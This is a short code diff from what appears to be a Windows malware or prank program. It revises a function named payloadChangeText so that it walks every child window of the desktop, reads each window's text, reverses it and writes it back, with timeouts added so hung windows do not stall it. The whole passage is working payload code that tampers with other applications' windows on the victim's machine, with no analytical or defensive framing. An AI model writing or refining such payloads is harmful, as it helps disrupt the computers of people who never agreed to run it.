@@ -121,31 +121,22 @@ LRESULT CALLBACK msgBoxHook(int nCode, WPARAM wParam, LPARAM lParam) {
 }
 
 int payloadChangeText(int times, int runtime) {
-	EnumWindows(&EnumWindowProc, NULL);
+	EnumChildWindows(GetDesktopWindow(), &EnumChildProc, NULL);
 
 	return 50;
 }
 
-BOOL CALLBACK EnumWindowProc(HWND hwnd, LPARAM lParam) {
-	enumerateChildren(hwnd);
-
-	return TRUE;
-}
-
-// TODO Fix Problems on Windows 10
-void enumerateChildren(HWND hwnd) {
+BOOL CALLBACK EnumChildProc(HWND hwnd, LPARAM lParam) {
 	LPWSTR str = (LPWSTR)GlobalAlloc(GMEM_ZEROINIT, sizeof(WCHAR) * 8192);
 
-	SendMessageW(hwnd, WM_GETTEXT, 8192, (LPARAM)str);
-	strReverseW(str);
-	SendMessageW(hwnd, WM_SETTEXT, NULL, (LPARAM)str);
+	if (SendMessageTimeoutW(hwnd, WM_GETTEXT, 8192, (LPARAM)str, SMTO_ABORTIFHUNG, 100, NULL)) {
+		strReverseW(str);
+		SendMessageTimeoutW(hwnd, WM_SETTEXT, NULL, (LPARAM)str, SMTO_ABORTIFHUNG, 100, NULL);
+	}
+	
 	GlobalFree(str);
 
-	HWND child = GetWindow(hwnd, GW_CHILD);
-	while (child) {
-		enumerateChildren(child);
-		child = GetWindow(child, GW_HWNDNEXT);
-	}
+	return TRUE;
 }
 
 int payloadSound(int times, int runtime) {
